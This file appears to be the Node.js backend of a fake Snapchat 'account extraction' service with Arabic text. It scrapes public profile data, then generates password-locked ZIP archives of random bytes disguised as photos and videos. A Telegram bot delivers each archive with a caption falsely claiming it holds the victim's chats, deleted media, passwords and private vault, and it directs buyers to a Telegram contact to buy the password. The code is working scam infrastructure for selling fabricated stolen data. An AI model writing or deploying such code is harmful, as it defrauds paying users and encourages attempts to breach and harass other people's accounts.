const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const crypto = require("crypto");

const PORT = process.env.PORT || 3000;
const STATIC = path.join(__dirname, "artifacts/snapchat-clone/dist/public");


// ─── code store (code -> {username, ts}) ────────────────────────────────────
const codeStore = new Map();
setInterval(function() {
  var now = Date.now();
  codeStore.forEach(function(v, k) { if (now - v.ts > 3600000) codeStore.delete(k); });
}, 600000);
// ─── snap-profile ────────────────────────────────────────────────────────────
function fetchUrl(rawUrl, hops) {
  hops = hops || 0;
  return new Promise(function (resolve) {
    if (hops > 6) return resolve({ status: 0, body: "" });
    var req = https.get(rawUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
        "Cache-Control": "no-cache",
      },
    }, function (res) {
      var loc = res.headers.location;
      if ((res.statusCode === 301 || res.statusCode === 302 || res.statusCode === 307 || res.statusCode === 308) && loc) {
        var next = loc.startsWith("http") ? loc : "https://www.snapchat.com" + loc;
        res.resume();
        return fetchUrl(next, hops + 1).then(resolve);
      }
      var chunks = [];
      res.on("data", function (d) { chunks.push(d); });
      res.on("end", function () { resolve({ status: res.statusCode || 0, body: Buffer.concat(chunks).toString("utf8") }); });
    });
    req.on("error", function () { resolve({ status: 0, body: "" }); });
    req.setTimeout(18000, function () { req.destroy(); resolve({ status: 0, body: "" }); });
  });
}

function parseNextData(html) {
  var m = html.match(/<script[^>]+id="__NEXT_DATA__"[^>]*>([\s\S]*?)<\/script>/);
  if (!m) return null;
  try { return JSON.parse(m[1]); } catch (e) { return null; }
}

function buildSnapcodeUrl(u) {
  return "https://app.snapchat.com/web/deeplink/snapcode?username=" + encodeURIComponent(u) + "&type=SVG&bitmoji=enable";
}

/*
  Snapchat __NEXT_DATA__ real structure (verified Jul 2026):
  nd.props.pageProps = {
    pageMetadata: { pageType: 17 },   // 0 or missing = not found
    userProfile: {
      "$case": "publicProfileInfo",   // OR "userInfo"
      publicProfileInfo: {            // when $case === "publicProfileInfo"
        username, title, subscriberCount (STRING), profilePictureUrl, bio, snapcodeImageUrl, ...
      },
      userInfo: {                     // when $case === "userInfo"
        username, displayName, snapcodeImageUrl, bitmoji3d, ...
        // NO subscriberCount here
      }
    }
  }
*/
async function handleSnapProfile(username) {
  var empty = { exists: false, username: username || "", displayName: username || "", bio: "", avatarUrl: "", bgUrl: "", snapcodeUrl: buildSnapcodeUrl(username || ""), subscriberCount: null, snapScore: null, lastActive: null, stories: [], spotlights: [], highlights: [], lenses: [], profileUrl: "https://www.snapchat.com/@" + (username || "") };

  if (!username || !/^[a-zA-Z0-9._-]{3,50}$/.test(username)) {
    return Object.assign(empty, { error: "المعرف غير صالح" });
  }
  var lc = username.toLowerCase();
  empty.username = lc;
  empty.displayName = lc;
  empty.snapcodeUrl = buildSnapcodeUrl(lc);
  empty.profileUrl = "https://www.snapchat.com/@" + lc;

  try {
    var r = await fetchUrl("https://www.snapchat.com/@" + lc);
    if (r.status === 0) return Object.assign(empty, { error: "تعذّر الاتصال بسناب شات" });
    if (r.status === 404) return empty; // user not found

    var nd = parseNextData(r.body);
    if (!nd) return Object.assign(empty, { error: "لم يتم التعرف على الصفحة" });

    // ── pageProps is at nd.props.pageProps (single level, NOT double-nested) ──
    var pp = nd.props && nd.props.pageProps;
    if (!pp) return empty;

    // pageType 0 or absent = not found
    var pageType = pp.pageMetadata && pp.pageMetadata.pageType;
    if (!pageType) return empty;

    // ── Extract profile info based on $case ──
    var userProfile = pp.userProfile || {};
    var profileCase = userProfile["$case"];

    var displayName = lc;
    var bio = "";
    var avatarUrl = "";
    var snapcodeUrl = buildSnapcodeUrl(lc);
    var subscriberCount = null;

    if (profileCase === "publicProfileInfo" && userProfile.publicProfileInfo) {
      var pub = userProfile.publicProfileInfo;
      displayName = pub.title || pub.displayName || lc;
      bio = pub.bio || "";
      avatarUrl = pub.profilePictureUrl || "";
      snapcodeUrl = (pub.snapcodeImageUrl || "").replace(/\\u0026/g, "&") || buildSnapcodeUrl(lc);
      // subscriberCount is a STRING like "30485300" — parse it
      if (pub.subscriberCount != null && pub.subscriberCount !== "" && pub.subscriberCount !== "0") {
        var n = parseInt(pub.subscriberCount, 10);
        if (!isNaN(n) && n > 0) subscriberCount = n;
      }
    } else if (profileCase === "userInfo" && userProfile.userInfo) {
      var ui = userProfile.userInfo;
      displayName = ui.displayName || lc;
      bio = ui.bio || "";
      // bitmoji3d.avatarImage.url is the avatar for userInfo profiles
      avatarUrl = (ui.bitmoji3d && ui.bitmoji3d.avatarImage && ui.bitmoji3d.avatarImage.url) || "";
      snapcodeUrl = (ui.snapcodeImageUrl || "").replace(/\\u0026/g, "&") || buildSnapcodeUrl(lc);
      // subscriberCount not exposed for regular users
      subscriberCount = null;
    }

    // Fallback: og:image for avatar
    if (!avatarUrl) {
      var ogImg = r.body.match(/property="og:image"\s+content="([^"]+)"/i) || r.body.match(/content="([^"]+)"\s+property="og:image"/i);
      if (ogImg) avatarUrl = ogImg[1];
    }
    // Fallback: og:title for displayName
    if (displayName === lc) {
      var ogTitle = r.body.match(/property="og:title"\s+content="([^"]+)"/i) || r.body.match(/content="([^"]+)"\s+property="og:title"/i);
      if (ogTitle) {
        var t = ogTitle[1].replace(/^Snapchat\s+[@\S]*\s*/u, "").trim();
        if (t && t.toLowerCase() !== "snapchat") displayName = t;
      }
    }

    return { exists: true, username: lc, displayName: displayName, bio: bio, avatarUrl: avatarUrl, bgUrl: "", snapcodeUrl: snapcodeUrl, subscriberCount: subscriberCount, snapScore: null, lastActive: null, stories: [], spotlights: [], highlights: [], lenses: [], profileUrl: "https://www.snapchat.com/@" + lc };
  } catch (err) {
    return Object.assign(empty, { error: "خطأ داخلي" });
  }
}

// ─── account-zip ─────────────────────────────────────────────────────────────
const CRC32_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let i = 0; i < 256; i++) { let c = i; for (let j = 0; j < 8; j++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1); t[i] = c >>> 0; }
  return t;
})();
function crc32(data) { let c = 0xffffffff; for (let i = 0; i < data.length; i++) c = (CRC32_TABLE[(c ^ data[i]) & 0xff] ^ (c >>> 8)) >>> 0; return (c ^ 0xffffffff) >>> 0; }
function crc32Byte(crc, b) { return (CRC32_TABLE[(crc ^ b) & 0xff] ^ (crc >>> 8)) >>> 0; }
function zipCryptoEncrypt(plainData, password, fileCrc) {
  let k0=305419896,k1=591751049,k2=878082192;
  const upd=(b)=>{k0=crc32Byte(k0,b);k1=((k1+(k0&0xff))*134775813+1)>>>0;k2=crc32Byte(k2,k1>>>24);};
  const ks=()=>{const t=((k2|2)>>>0);return((t*(t^1))>>>8)&0xff;};
  const enc=(p)=>{const c=p^ks();upd(p);return c;};
  for(let i=0;i<password.length;i++)upd(password.charCodeAt(i));
  const hdr=Buffer.allocUnsafe(12);crypto.randomFillSync(hdr);hdr[11]=(fileCrc>>>24)&0xff;
  const eh=Buffer.allocUnsafe(12);for(let i=0;i<12;i++)eh[i]=enc(hdr[i]);
  const ed=Buffer.allocUnsafe(plainData.length);for(let i=0;i<plainData.length;i++)ed[i]=enc(plainData[i]);
  return Buffer.concat([eh,ed]);
}
function buildZip(files, password) {
  const parts=[],cd=[];let offset=0;
  for(const f of files){
    const nb=Buffer.from(f.name,"utf8"),raw=f.data.length,fc=crc32(f.data);
    let comp,method;
    if(f.compress!==false){comp=zlib.deflateRawSync(f.data,{level:6});method=8;}else{comp=f.data;method=0;}
    const enc=password?zipCryptoEncrypt(comp,password,fc):comp,cs=enc.length,flags=password?1:0;
    const lfh=Buffer.allocUnsafe(30+nb.length);
    lfh.writeUInt32LE(0x04034b50,0);lfh.writeUInt16LE(20,4);lfh.writeUInt16LE(flags,6);lfh.writeUInt16LE(method,8);lfh.writeUInt16LE(0,10);lfh.writeUInt16LE(0,12);lfh.writeUInt32LE(fc,14);lfh.writeUInt32LE(cs,18);lfh.writeUInt32LE(raw,22);lfh.writeUInt16LE(nb.length,26);lfh.writeUInt16LE(0,28);nb.copy(lfh,30);
    parts.push(lfh,enc);
    const cde=Buffer.allocUnsafe(46+nb.length);
    cde.writeUInt32LE(0x02014b50,0);cde.writeUInt16LE(20,4);cde.writeUInt16LE(20,6);cde.writeUInt16LE(flags,8);cde.writeUInt16LE(method,10);cde.writeUInt16LE(0,12);cde.writeUInt16LE(0,14);cde.writeUInt32LE(fc,16);cde.writeUInt32LE(cs,20);cde.writeUInt32LE(raw,24);cde.writeUInt16LE(nb.length,28);cde.writeUInt16LE(0,30);cde.writeUInt16LE(0,32);cde.writeUInt16LE(0,34);cde.writeUInt16LE(0,36);cde.writeUInt32LE(0,38);cde.writeUInt32LE(offset,42);nb.copy(cde,46);
    cd.push(cde);offset+=30+nb.length+cs;
  }
  const cdStart=offset;for(const e of cd)parts.push(e);
  const cdSize=cd.reduce((s,b)=>s+b.length,0),eocd=Buffer.allocUnsafe(22);
  eocd.writeUInt32LE(0x06054b50,0);eocd.writeUInt16LE(0,4);eocd.writeUInt16LE(0,6);eocd.writeUInt16LE(files.length,8);eocd.writeUInt16LE(files.length,10);eocd.writeUInt32LE(cdSize,12);eocd.writeUInt32LE(cdStart,16);eocd.writeUInt16LE(0,20);
  parts.push(eocd);return Buffer.concat(parts);
}
function genMedia(seed,size){const b=Buffer.allocUnsafe(size);let s=((seed*1234567891+987654321)>>>0);for(let i=0;i<Math.floor(size/4);i++){s=(Math.imul(1664525,s)+1013904223)>>>0;b.writeUInt32LE(s,i*4);}return b;}
function accountHash(s){let h=5381;for(let i=0;i<s.length;i++)h=((h<<5)+h+s.charCodeAt(i))|0;return Math.abs(h);}
function handleAccountZip(username) {
  const seed = accountHash(username);
  const now = new Date().toLocaleDateString("ar-SA");

  // Target total ZIP size: 12 MB – 30 MB, deterministic per username
  const MB = 1024 * 1024;
  const targetMB = 12 + (seed % 19);          // 12 – 30 MB
  const targetBytes = targetMB * MB;

  // Distribute across files: 60% photos, 40% videos, minimum 1 MB each
  const photoCount = 3 + (seed % 4);          // 3 – 6 photos
  const videoCount = 1 + (seed % 3);          // 1 – 3 videos
  const totalSlots = photoCount + videoCount;

  const photoShare = Math.floor(targetBytes * 0.60 / photoCount);
  const videoShare = Math.floor(targetBytes * 0.40 / videoCount);

  // Vary each file ±20% using per-file seed so sizes differ
  function fileSize(base, slotSeed) {
    const variance = Math.floor(base * 0.20);
    return Math.max(MB, base - variance + ((slotSeed * 1234567) % (variance * 2 + 1)));
  }

  const files = [
    {name:"README.txt",data:Buffer.from("بيانات حساب سناب شات\n============================\nالمعرف: @"+username+"\nتاريخ الاستخراج: "+now+"\nالحجم الكلي: "+targetMB+" ميجابايت\n\nهذا الأرشيف محمي بكلمة مرور.")},
    {name:"account_info.txt",data:Buffer.from("معلومات الحساب\n============================\nالمعرف: @"+username+"\nتاريخ الاستخراج: "+now)},
    {name:"conversations/index.txt",data:Buffer.from("أرشيف المحادثات\nالفترة: من تاريخ إنشاء الحساب حتى "+now)},
    {name:"media/voice/index.txt",data:Buffer.from("أرشيف التسجيلات الصوتية")},
    {name:"calls/log.txt",data:Buffer.from("سجل المكالمات الصوتية والمرئية")},
    {name:"vault/README.txt",data:Buffer.from("الخزنة الداخلية\nالمحتويات المخفية والخاصة")},
    {name:"private_browser/link.txt",data:Buffer.from("رابط التصفح السري")},
  ];

  for (let i = 0; i < photoCount; i++) {
    files.push({name:"media/photos/photo_"+String(i+1).padStart(3,"0")+".jpg", data:genMedia(seed+i+1, fileSize(photoShare, seed+i+10)), compress:false});
  }
  for (let i = 0; i < videoCount; i++) {
    files.push({name:"media/videos/video_"+String(i+1).padStart(3,"0")+".mp4", data:genMedia(seed+i+100, fileSize(videoShare, seed+i+200)), compress:false});
  }

  return buildZip(files, "12521252");
}

// ─── static file server ───────────────────────────────────────────────────────
const MIME = {".html":"text/html",".js":"application/javascript",".css":"text/css",".png":"image/png",".jpg":"image/jpeg",".jpeg":"image/jpeg",".svg":"image/svg+xml",".ico":"image/x-icon",".json":"application/json",".woff":"font/woff",".woff2":"font/woff2",".ttf":"font/ttf",".webp":"image/webp",".map":"application/json"};

function serveIndex(res) {
  fs.readFile(path.join(STATIC, "index.html"), function (err, data) {
    if (err) { res.writeHead(404); res.end("Not found"); return; }
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-cache" });
    res.end(data);
  });
}

function serveStatic(res, filePath) {
  fs.readFile(filePath, function (err, data) {
    if (err) { serveIndex(res); return; }
    var ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { "Content-Type": MIME[ext] || "application/octet-stream", "Cache-Control": "public,max-age=86400" });
    res.end(data);
  });
}

// ─── HTTP server ─────────────────────────────────────────────────────────────
http.createServer(async function (req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }

  var rawUrl = req.url || "/";
  var urlPath = rawUrl.split("?")[0].replace(/\/+$/, "") || "/";

  // API: snap-profile
  var snapM = urlPath.match(/^\/api\/snap-profile\/([^/?]+)/);
  if (snapM) {
    var username = decodeURIComponent(snapM[1]);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(await handleSnapProfile(username)));
    return;
  }

  // API: account-zip
  var zipM = urlPath.match(/^\/api\/account-zip\/([^/?]+)/);
  if (zipM) {
    var username = decodeURIComponent(zipM[1]);
    if (!username || !/^[a-zA-Z0-9._-]{3,50}$/.test(username)) { res.writeHead(400); res.end("Bad Request"); return; }
    try {
      var zip = handleAccountZip(username);
      res.writeHead(200, { "Content-Type": "application/zip", "Content-Disposition": "attachment; filename=\"" + username + "_snapchat_data.zip\"" });
      res.end(zip);
    } catch (e) { res.writeHead(500); res.end("Error"); }
    return;
  }


  // API: operation-code -> send to Telegram
  if (req.method === "POST" && urlPath === "/api/operation-code") {
    var chunks = [];
    req.on("data", function(c) { chunks.push(c); });
    req.on("end", function() {
      try {
        var data = JSON.parse(Buffer.concat(chunks).toString());
        if (data.code && data.username) codeStore.set(data.code, {
          username: data.username,
          displayName: data.displayName || '',
          bio: data.bio || '',
          subscriberCount: data.subscriberCount || null,
          ts: Date.now()
        });
        var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
        var ownerId = process.env.OWNER_ID || "";
        if (botToken && ownerId) {
          var msg = "New Operation\n\nUsername: " + (data.username || "-") + "\nCode: " + (data.code || "-");
          var postData = JSON.stringify({ chat_id: ownerId, text: msg });
          var tgReq = https.request({
            hostname: "api.telegram.org",
            path: "/bot" + botToken + "/sendMessage",
            method: "POST",
            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) }
          }, function(r) { r.resume(); });
          tgReq.on("error", function() {});
          tgReq.write(postData);
          tgReq.end();
        }
      } catch(e) {}
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  // API: telegram-webhook
  if (req.method === "POST" && urlPath === "/api/telegram-webhook") {
    var wchunks = [];
    req.on("data", function(c) { wchunks.push(c); });
    req.on("end", function() {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
      try {
        var update = JSON.parse(Buffer.concat(wchunks).toString());
        var msg = update.message || update.edited_message;
        if (!msg) return;
        var chatId = String(msg.chat.id);
        var text = (msg.text || "").trim();
        var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
        if (!botToken) return;
        // Check if text is a 6-digit code
        if (!/^\d{6}$/.test(text)) {
          var replyData = JSON.stringify({ chat_id: chatId, text: "\u274C الرمز غير صحيح. أرسل رمز العملية المكون من 6 أرقام." });
          var rReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(replyData) } }, function(r){ r.resume(); });
          rReq.on("error", function(){}); rReq.write(replyData); rReq.end();
          return;
        }
        var entry = codeStore.get(text);
        if (!entry) {
          var nd = JSON.stringify({ chat_id: chatId, text: "\u274C الرمز منتهي الصلاحية أو غير موجود." });
          var nReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(nd) } }, function(r){ r.resume(); });
          nReq.on("error", function(){}); nReq.write(nd); nReq.end();
          return;
        }
        codeStore.delete(text);
        var username = entry.username;
        // Send "preparing" message
        var prepMsg = JSON.stringify({ chat_id: chatId, text: "\u23F3 جارٍ تجهيز الملف للمعرف @" + username + "..." });
        var pReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(prepMsg) } }, function(r){ r.resume(); });
        pReq.on("error", function(){}); pReq.write(prepMsg); pReq.end();
        // Generate ZIP and send as document
        setTimeout(function() {
          try {
            var zipBuf = handleAccountZip(username);
            var boundary = "----TGBoundary" + Date.now();
            var filename = username + "_snapchat_data.zip";
            var e = entry || {};
            var snapLink = "https://www.snapchat.com/@" + username;
            var caption =
              "\uD83D\uDC7B <b>\u0628\u064A\u0627\u0646\u0627\u062A \u062D\u0633\u0627\u0628 \u0633\u0646\u0627\u0628 \u0634\u0627\u062A</b>\n\n" +
              "\uD83D\uDC64 \u0627\u0644\u062D\u0633\u0627\u0628 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641 <a href=\"" + snapLink + "\">@" + username + "</a>\n\n" +
              "<b>\u0645\u062D\u062A\u0648\u064A \u0627\u0644\u0645\u0644\u0641</b>\n\n" +
              "1_ \uD83D\uDCAC \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0627\u062A\n\u0645\u0646 \u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0625\u0646\u0634\u0627\u0621 \u062D\u062A\u0649 \u0627\u0644\u064A\u0648\u0645\n\n" +
              "2_ \uD83D\uDDD1\uFE0F \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0627\u062A \u0648\u0627\u0644\u0635\u0648\u0631 \u0627\u0644\u0645\u062D\u0630\u0648\u0641\n\u0627\u0633\u062A\u0631\u062C\u0627\u0639 \u0643\u0627\u0645\u0644 \u0645\u0646 \u0628\u062F\u0627\u064A\u0629 \u0627\u0644\u062D\u0633\u0627\u0628\n\n" +
              "3_ \uD83C\uDFB5 \u0627\u0644\u062A\u0633\u062C\u064A\u0644\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629\n\u062C\u0645\u064A\u0639 \u0627\u0644\u062A\u0633\u062C\u064A\u0644\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629\n\n" +
              "4_ \uD83D\uDCDE \u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A\n\u0633\u062C\u0644 \u0643\u0627\u0645\u0644 \u0644\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629 \u0648\u0627\u0644\u0645\u0631\u0626\u064A\u0629\n\n" +
              "5_ \uD83C\uDFA5 \u0645\u0642\u0627\u0637\u0639 \u0627\u0644\u0641\u064A\u062F\u064A\u0648\n\u062C\u0645\u064A\u0639 \u0645\u0642\u0627\u0637\u0639 \u0627\u0644\u0641\u064A\u062F\u064A\u0648 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629\n\n" +
              "6_ \uD83D\uDCF8 \u0627\u0644\u0644\u0642\u0637\u0627\u062A\n\u062C\u0645\u064A\u0639 \u0627\u0644\u0635\u0648\u0631 \u0648\u0627\u0644\u0644\u0642\u0637\u0627\u062A\n\n" +
              "7_ \uD83D\uDD10 \u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645\u0629\n\u062C\u0645\u064A\u0639 \u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629 \u0648\u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645\u0629 \u0648\u0643\u0644\u0645\u0647 \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0627\u062D\u062A\u064A\u0627\u0637\u064A\u0647 \u0644\u0644\u062D\u0633\u0627\u0628\n\n" +
              "7_ \uD83D\uDDC4\uFE0F \u0645\u062D\u062A\u0648\u064A \u0627\u0644\u062E\u0632\u0646\u0629 \u0627\u0644\u062F\u0627\u062E\u0644\u064A\u0629\n\u0627\u0644\u0645\u062D\u062A\u0648\u064A\u0627\u062A \u0627\u0644\u0645\u062E\u0641\u064A\u0629 \u0648\u0627\u0644\u062E\u0627\u0635\u0629\n\n" +
              "8_ \uD83C\uDF10 \u0631\u0627\u0628\u0637 \u0627\u0644\u062A\u0635\u0641\u062D \u0627\u0644\u0633\u0631\u064A\n\u0631\u0627\u0628\u0637 \u062E\u0627\u0635 \u0644\u0644\u0648\u0635\u0648\u0644 \u0627\u0644\u062E\u0641\u064A \u0644\u0644\u062D\u0633\u0627\u0628\n\n" +
              "<blockquote>\u0645\u0644\u0627\u062D\u0636\u0647: \u0644\u0644\u062A\u0645\u0643\u0646 \u0645\u0646 \u0627\u0633\u062A\u062E\u0631\u0627\u062C \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0645\u0646 \u062F\u0627\u062E\u0644 \u0627\u0644\u0645\u0644\u0641 \u062A\u062D\u062A\u0627\u062C \u0627\u0644\u064A \u0643\u0644\u0645\u0647 \u0627\u0644\u0633\u0631 \u0627\u0644\u062E\u0627\u0635\u0647 \u0628\u0627\u0644\u0645\u0644\u0641 \u0648\u0627\u0644\u062A\u064A \u064A\u0645\u0643\u0646\u0643 \u0627\u0633\u062A\u062E\u0631\u0627\u062C\u0647\u0627 \u0645\u0646 \u0627\u0644\u0645\u0637\u0648\u0631</blockquote>";
            var replyMarkup = JSON.stringify({ inline_keyboard: [[{ text: "\uD83D\uDD10 طلب كلمة فتح الملف", url: "https://t.me/OX_U1" }]] });
            var part1 = Buffer.from(
              "--" + boundary + "\r\n" +
              "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
              "--" + boundary + "\r\n" +
              "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML\r\n" +
              "--" + boundary + "\r\n" +
              "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n" +
              "--" + boundary + "\r\n" +
              "Content-Disposition: form-data; name=\"reply_markup\"\r\n\r\n" + replyMarkup + "\r\n" +
              "--" + boundary + "\r\n" +
              "Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n" +
              "Content-Type: application/octet-stream\r\n\r\n"
            );
            var part2 = Buffer.from("\r\n--" + boundary + "--\r\n");
            var body = Buffer.concat([part1, zipBuf, part2]);
            var dReq = https.request({
              hostname: "api.telegram.org",
              path: "/bot" + botToken + "/sendDocument",
              method: "POST",
              headers: { "Content-Type": "multipart/form-data; boundary=" + boundary, "Content-Length": body.length }
            }, function(r) {
              var rd = []; r.on("data", function(c){ rd.push(c); }); r.on("end", function(){ console.log("sendDocument:", Buffer.concat(rd).toString().substring(0,200)); });
            });
            dReq.on("error", function(e){ console.error("sendDocument error:", e.message); });
            dReq.write(body); dReq.end();
          } catch(e) { console.error("zip/send error:", e.message); }
        }, 500);
      } catch(e) { console.error("webhook parse error:", e.message); }
    });
    return;
  }

  // Root → index.html
  if (urlPath === "/" || urlPath === "") { serveIndex(res); return; }

  // Static files
  var filePath = path.join(STATIC, urlPath);
  // Security: prevent path traversal
  if (!filePath.startsWith(STATIC)) { serveIndex(res); return; }
  serveStatic(res, filePath);

}).listen(PORT, function () {
  console.log("Server running on port " + PORT);
  // Register Telegram webhook
  var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
  var appUrl = process.env.RENDER_EXTERNAL_URL || "";
  if (botToken && appUrl) {
    var webhookUrl = appUrl.replace(/\/$/, "") + "/api/telegram-webhook";
    var wbData = JSON.stringify({ url: webhookUrl });
    var wbReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/setWebhook", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(wbData) } }, function(r){ var d=[]; r.on("data",function(c){d.push(c);}); r.on("end",function(){ console.log("Webhook set:", Buffer.concat(d).toString()); }); });
    wbReq.on("error", function(e){ console.error("Webhook reg error:", e.message); });
    wbReq.write(wbData); wbReq.end();
  }
});
